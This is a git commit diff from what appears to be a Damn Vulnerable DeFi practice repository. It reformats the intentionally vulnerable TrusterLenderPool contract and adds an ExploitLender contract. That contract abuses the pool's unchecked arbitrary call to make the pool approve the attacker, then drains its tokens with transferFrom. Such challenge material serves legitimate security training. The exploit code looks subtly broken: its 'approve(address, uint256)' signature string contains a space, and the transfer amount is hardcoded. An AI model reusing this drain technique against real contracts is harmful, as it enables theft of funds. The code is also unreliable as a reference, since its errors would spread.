a9f344895704cc3fdb7195b17b0c080de665777d
Aboudoc <aboutika.reda@gmail.com>
2023-01-04 10:48:31 +0100

    initial commit

--- contracts/truster/TrusterLenderPool.sol
+++ contracts/truster/TrusterLenderPool.sol
@@ -11,12 +11,11 @@ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
  */
 contract TrusterLenderPool is ReentrancyGuard {
-
     using Address for address;
 
     IERC20 public immutable damnValuableToken;
 
-    constructor (address tokenAddress) {
+    constructor(address tokenAddress) {
         damnValuableToken = IERC20(tokenAddress);
     }
 
@@ -25,18 +24,34 @@ contract TrusterLenderPool is ReentrancyGuard {
         address borrower,
         address target,
         bytes calldata data
-    )
-        external
-        nonReentrant
-    {
+    ) external nonReentrant {
         uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
         require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
-        
+
         damnValuableToken.transfer(borrower, borrowAmount);
         target.functionCall(data);
 
         uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
-        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
+        require(
+            balanceAfter >= balanceBefore,
+            "Flash loan hasn't been paid back"
+        );
     }
+}
 
+contract ExploitLender {
+    function exploit(address _pool, address _token) public {
+        TrusterLenderPool pool = TrusterLenderPool(_pool);
+        IERC20 token = IERC20(_token);
+
+        bytes memory data = abi.encodeWithSignature(
+            "approve(address, uint256)",
+            address(this),
+            token.balanceOf(_pool)
+        );
+
+        pool.flashLoan(0, msg.sender, _token, data);
+
+        token.transferFrom(_pool, address(this), 1000000);
+    }
 }
